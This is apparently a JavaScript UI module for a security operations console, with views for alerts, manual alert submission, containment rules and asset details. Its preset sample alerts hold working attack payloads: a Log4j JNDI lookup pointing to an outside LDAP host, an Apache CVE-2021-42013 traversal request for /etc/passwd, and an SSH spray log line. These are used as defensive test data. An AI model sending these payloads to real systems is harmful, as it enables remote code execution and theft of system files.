import { $, $$, api, esc, sev, pill, flow, ago, stamp, markPayload, drawer, modal, closeLayer, toast, busy, emit, num, label, state } from './core.js';
import { icon } from './icons.js';

// Overlays reused by several views.

export async function openAlert(alertId, navigate) {
  const panel = drawer(`<div class="drawer__head"><div class="grow"><div class="eyebrow">${esc(alertId)}</div><div class="skeleton" style="height:28px;margin-top:8px;width:80%"></div></div><button class="icon-btn icon-btn--bare" data-close aria-label="Close">${icon('x')}</button></div><div class="drawer__body"><div class="skeleton" style="height:120px"></div><div class="skeleton" style="height:160px"></div></div>`);
  let data;
  try { data = await api(`/alerts/${encodeURIComponent(alertId)}`); } catch (e) { toast('Could not load alert', e.message, 'error'); closeLayer(); return; }
  const { alert: a, asset, investigations } = data;
  const last = investigations[0];
  panel.innerHTML = `
    <div class="drawer__head">
      <div class="grow">
        <div class="eyebrow">${esc(a.alert_id)} &middot; ${esc(a.sensor || 'sensor')} &middot; ${ago(a.detected_at)}</div>
        <h2 class="drawer__title">${esc(a.signature)}</h2>
        <div class="row wrap mt-12">${sev(a.severity)} ${pill(a.status)} <span class="tag">${esc(a.category)}</span></div>
      </div>
      <button class="icon-btn icon-btn--bare" data-close aria-label="Close">${icon('x')}</button>
    </div>
    <div class="drawer__body">
      <section>
        <h3 class="section-title">Flow</h3>
        <dl class="dl">
          <dt>Source</dt><dd class="ip">${esc(a.source_ip)}</dd>
          <dt>Destination</dt><dd class="ip">${esc(a.dest_ip)}:${esc(a.dest_port)} <span class="muted">${esc(a.protocol)}</span></dd>
          <dt>Detected</dt><dd class="mono">${stamp(a.detected_at)}</dd>
          ${asset ? `<dt>Target host</dt><dd>${esc(asset.hostname)} <span class="muted">&middot; ${esc(asset.os_version)} &middot; ${esc(asset.criticality.toLowerCase())} criticality</span></dd>` : ''}
        </dl>
      </section>
      <section>
        <div class="row"><h3 class="section-title grow" style="margin:0">Captured payload</h3><button class="btn btn--ghost btn--sm" id="copy-payload">${icon('copy')}Copy</button></div>
        <pre class="code mt-8">${markPayload(a.raw_payload)}</pre>
      </section>
      ${last ? `
      <section>
        <h3 class="section-title">Latest investigation</h3>
        <div class="list__item is-clickable" style="border:1px solid var(--line);border-radius:var(--r);padding:12px 14px" id="open-inv">
          ${pill(last.outcome)}
          <div><div class="list__title">${esc(last.investigation_id)} &middot; ${last.confidence}% confidence</div><div class="list__sub">${esc(last.engine)} &middot; ${ago(last.created_at)}${last.human_override ? ' &middot; overridden' : ''}</div></div>
          ${icon('arrow')}
        </div>
      </section>` : ''}
    </div>
    <div class="drawer__foot">
      <button class="btn btn--primary" id="d-investigate" ${a.status === 'INVESTIGATING' ? 'disabled' : ''}>${icon('play')}${last ? 'Re-investigate' : 'Investigate'}</button>
      ${['NEW', 'CONFIRMED'].includes(a.status) ? '<button class="btn" id="d-fp">Mark false positive</button>' : ''}
      ${a.status !== 'CLOSED' && a.status !== 'NEW' ? '<button class="btn btn--ghost" id="d-close">Close alert</button>' : ''}
      ${a.status === 'CLOSED' || a.status === 'FALSE_POSITIVE' ? '<button class="btn btn--ghost" id="d-reopen">Reopen</button>' : ''}
    </div>`;
  $('#copy-payload', panel).onclick = async () => {
    try { await navigator.clipboard.writeText(a.raw_payload); toast('Payload copied'); } catch { toast('Clipboard unavailable', '', 'error'); }
  };
  $('#d-investigate', panel).onclick = () => { closeLayer(); navigate(`investigate/${a.alert_id}`); };
  const oi = $('#open-inv', panel);
  if (oi) oi.onclick = () => { closeLayer(); navigate(`investigate/${a.alert_id}`); };
  const setStatus = (status, msg) => async (e) => {
    await busy(e.currentTarget, async () => {
      try {
        await api(`/alerts/${a.alert_id}/status`, { method: 'POST', body: { status, analyst: state.config?.analystName } });
        toast(msg, a.alert_id, 'ok');
        emit('data:changed');
        closeLayer();
      } catch (err) { toast('Update failed', err.message, 'error'); }
    });
  };
  if ($('#d-fp', panel)) $('#d-fp', panel).onclick = setStatus('FALSE_POSITIVE', 'Marked as false positive');
  if ($('#d-close', panel)) $('#d-close', panel).onclick = setStatus('CLOSED', 'Alert closed');
  if ($('#d-reopen', panel)) $('#d-reopen', panel).onclick = setStatus('NEW', 'Alert reopened');
}

const PRESETS = {
  log4j: { signature: 'ET EXPLOIT Log4j JNDI lookup in X-Api-Version header', category: 'Exploit / RCE', severity: 'CRITICAL', source_ip: '198.51.100.23', dest_ip: '10.0.4.15', dest_port: 8080, protocol: 'TCP/HTTP',
    raw_payload: 'GET /api/v1/items HTTP/1.1\r\nHost: 10.0.4.15:8080\r\nX-Api-Version: ${jndi:ldap://198.51.100.23:1389/a}\r\nAccept: */*' },
  traversal: { signature: 'ET WEB_SERVER Apache double-encoded traversal (CVE-2021-42013)', category: 'Exploit / Traversal', severity: 'HIGH', source_ip: '203.0.113.77', dest_ip: '10.0.4.88', dest_port: 80, protocol: 'TCP/HTTP',
    raw_payload: 'GET /cgi-bin/.%2e/.%2e/.%2e/etc/passwd HTTP/1.1\r\nHost: 10.0.4.88' },
  ssh: { signature: 'ET SCAN SSH password spray against build runner', category: 'Credential Access', severity: 'MEDIUM', source_ip: '192.0.2.144', dest_ip: '10.0.6.40', dest_port: 22, protocol: 'TCP/SSH',
    raw_payload: 'Failed password for invalid user git from 192.0.2.144 port 50122 ssh2' }
};

export function openNewAlert(navigate) {
  const panel = modal(`
    <div class="modal__head"><div class="eyebrow">Manual submission</div><h2 class="modal__title">Submit an alert</h2></div>
    <form class="modal__body" id="alert-form" novalidate>
      <div class="row wrap" style="margin-bottom:14px">
        <span class="small muted">Start from:</span>
        <button type="button" class="btn btn--sm" data-preset="log4j">Log4j probe</button>
        <button type="button" class="btn btn--sm" data-preset="traversal">Apache traversal</button>
        <button type="button" class="btn btn--sm" data-preset="ssh">SSH spray</button>
      </div>
      <div class="form-grid">
        <label class="field span-2"><span>Signature</span><input class="input" name="signature" required placeholder="e.g. ET EXPLOIT ..."></label>
        <label class="field"><span>Source IP</span><input class="input input--mono" name="source_ip" required placeholder="203.0.113.10"></label>
        <label class="field"><span>Destination IP</span><input class="input input--mono" name="dest_ip" required placeholder="10.0.4.15" list="asset-ips"></label>
        <label class="field"><span>Port</span><input class="input input--mono" name="dest_port" type="number" min="1" max="65535" value="80"></label>
        <label class="field"><span>Severity</span><select class="select" name="severity"><option>CRITICAL</option><option selected>HIGH</option><option>MEDIUM</option><option>LOW</option></select></label>
        <label class="field"><span>Protocol</span><input class="input" name="protocol" value="TCP/HTTP"></label>
        <label class="field"><span>Category</span><input class="input" name="category" value="Exploit attempt"></label>
        <label class="field span-2"><span>Payload</span><textarea class="textarea" name="raw_payload" required placeholder="Raw request or log line"></textarea></label>
      </div>
      <datalist id="asset-ips"><option value="10.0.4.15"><option value="10.0.4.22"><option value="10.0.4.88"><option value="10.0.4.102"><option value="10.0.6.40"></datalist>
    </form>
    <div class="modal__foot"><span class="form-error" id="af-err"></span><button class="btn btn--ghost" data-close>Cancel</button><button class="btn" id="af-save">Submit</button><button class="btn btn--primary" id="af-run">${icon('play')}Submit &amp; investigate</button></div>`);
  const form = $('#alert-form', panel);
  $$('[data-preset]', panel).forEach((b) => {
    b.onclick = () => {
      const p = PRESETS[b.dataset.preset];
      Object.entries(p).forEach(([k, v]) => { if (form.elements[k]) form.elements[k].value = String(v).replace(/\r\n/g, '\n'); });
    };
  });
  const submit = (andRun) => async (e) => {
    e.preventDefault();
    const body = Object.fromEntries(new FormData(form));
    body.dest_port = Number(body.dest_port);
    body.raw_payload = body.raw_payload.replace(/\n/g, '\r\n');
    body.analyst = state.config?.analystName;
    await busy(e.currentTarget, async () => {
      try {
        const created = await api('/alerts', { method: 'POST', body });
        toast('Alert submitted', created.alert_id, 'ok');
        emit('data:changed');
        closeLayer();
        if (andRun) navigate(`investigate/${created.alert_id}?run=1`);
      } catch (err) { $('#af-err', panel).textContent = err.message; }
    });
  };
  $('#af-save', panel).onclick = submit(false);
  $('#af-run', panel).onclick = submit(true);
  form.onsubmit = submit(false);
}

export function openNewRule(prefill = {}) {
  const panel = modal(`
    <div class="modal__head"><div class="eyebrow">Containment</div><h2 class="modal__title">Add a rule</h2></div>
    <form class="modal__body" id="rule-form" novalidate>
      <div class="form-grid">
        <label class="field"><span>Target IP</span><input class="input input--mono" name="target_ip" required value="${esc(prefill.target_ip || '')}" placeholder="203.0.113.10"></label>
        <label class="field"><span>Action</span><select class="select" name="action"><option value="BLOCK">Block at perimeter</option><option value="ISOLATE">Isolate host</option></select></label>
        <label class="field span-2"><span>Reason</span><input class="input" name="reason" required value="${esc(prefill.reason || '')}" placeholder="Why this rule exists (shown to the next shift)"></label>
      </div>
      <p class="small muted mt-12">Block drops inbound traffic from an external address. Isolate quarantines an internal host from everything except the management VLAN.</p>
    </form>
    <div class="modal__foot"><span class="form-error" id="rf-err"></span><button class="btn btn--ghost" data-close>Cancel</button><button class="btn btn--primary" id="rf-save">${icon('lock')}Apply rule</button></div>`);
  const form = $('#rule-form', panel);
  const go = async (e) => {
    e.preventDefault();
    const body = Object.fromEntries(new FormData(form));
    body.analyst = state.config?.analystName;
    await busy($('#rf-save', panel), async () => {
      try {
        const r = await api('/rules', { method: 'POST', body });
        toast('Rule applied', `${r.action} ${r.target_ip} (${r.rule_id})`, 'ok');
        emit('data:changed');
        closeLayer();
      } catch (err) { $('#rf-err', panel).textContent = err.message; }
    });
  };
  $('#rf-save', panel).onclick = go;
  form.onsubmit = go;
}

export function openAsset(a, navigate) {
  const panel = drawer(`
    <div class="drawer__head">
      <div class="grow">
        <div class="eyebrow">${esc(a.ip_address)} &middot; ${esc(a.owner || 'unowned')}</div>
        <h2 class="drawer__title">${esc(a.hostname)}</h2>
        <div class="row wrap mt-12">${sev(a.criticality)} <span class="tag">${esc(a.os_version)}</span> ${a.waf_enabled ? '<span class="tag tag--ok">WAF</span>' : '<span class="tag">No WAF</span>'}</div>
      </div>
      <button class="icon-btn icon-btn--bare" data-close aria-label="Close">${icon('x')}</button>
    </div>
    <div class="drawer__body">
      <section><h3 class="section-title">Listening services</h3>
        <div class="table-wrap"><table class="table"><tbody>${a.running_services.map((s) => `<tr><td class="mono" style="width:70px">${s.port}</td><td>${esc(s.service)}</td></tr>`).join('')}</tbody></table></div>
      </section>
      <section><h3 class="section-title">Installed packages</h3><div class="row wrap">${a.installed_packages.map((p) => `<span class="tag">${esc(p)}</span>`).join('')}</div></section>
      <section><h3 class="section-title">Known exposure</h3>
        ${a.exposures.length ? a.exposures.map((c) => `<div class="row" style="padding:6px 0">${sev(c.severity)}<b class="mono">${esc(c.cve_id)}</b><span class="muted small">CVSS ${c.cvss_score}</span></div>`).join('') : '<p class="muted small" style="margin:0">No matching entries in the knowledge base.</p>'}
      </section>
      <section><h3 class="section-title">Recent telemetry</h3><div id="asset-logs"><div class="skeleton" style="height:80px"></div></div></section>
    </div>
    <div class="drawer__foot">
      <button class="btn" id="a-logs">${icon('terminal')}Open telemetry</button>
      <button class="btn btn--danger" id="a-iso">${icon('lock')}Isolate host</button>
    </div>`);
  api(`/logs?host_ip=${encodeURIComponent(a.ip_address)}&limit=6`).then((logs) => {
    $('#asset-logs', panel).innerHTML = logs.length
      ? `<pre class="code">${logs.map((l) => `${esc(l.log_type.padEnd(12))} ${markPayload(l.raw_entry)}`).join('\n')}</pre>`
      : '<p class="muted small" style="margin:0">No telemetry for this host.</p>';
  }).catch(() => {});
  $('#a-logs', panel).onclick = () => { closeLayer(); navigate(`telemetry?host=${a.ip_address}`); };
  $('#a-iso', panel).onclick = () => openNewRule({ target_ip: a.ip_address, reason: `Manual isolation of ${a.hostname}` });
  setTimeout(() => { const s = $('select[name="action"]'); if (s) s.value = 'ISOLATE'; }, 0);
}

export { num, label };